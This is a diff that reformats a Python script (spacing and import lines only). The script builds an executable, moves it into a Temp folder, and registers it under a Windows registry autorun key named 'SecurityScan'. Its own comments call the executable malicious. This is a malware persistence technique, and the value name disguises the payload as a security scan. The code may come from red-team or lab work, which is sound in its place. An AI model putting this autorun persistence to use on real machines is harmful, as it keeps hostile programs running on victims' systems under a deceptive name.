@@ -1,8 +1,10 @@
-import os, shutil, winreg
+import os
+import shutil
+import winreg
 
-filedir = os.path.join(os.getcwd(),"Temp")
+filedir = os.path.join(os.getcwd(), "Temp")
 filename = "benign.exe"
-filepath = os.path.join(filedir,filename)
+filepath = os.path.join(filedir, filename)
 
 if os.path.isfile(filepath):
     os.remove(filepath)
@@ -11,7 +13,7 @@ if os.path.isfile(filepath):
 os.system("python BuildExe.py")
 
 # Move malicious executable to desired directory
-shutil.move(filename,filedir)
+shutil.move(filename, filedir)
 
 
 # Windows default autorun keys:
@@ -33,6 +35,6 @@ else:
 
 
 # Add registry autorun key
-reg = winreg.ConnectRegistry(None,reghive)
-key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
-winreg.SetValueEx(key,"SecurityScan",0,winreg.REG_SZ,filepath)
+reg = winreg.ConnectRegistry(None, reghive)
+key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
+winreg.SetValueEx(key, "SecurityScan", 0, winreg.REG_SZ, filepath)
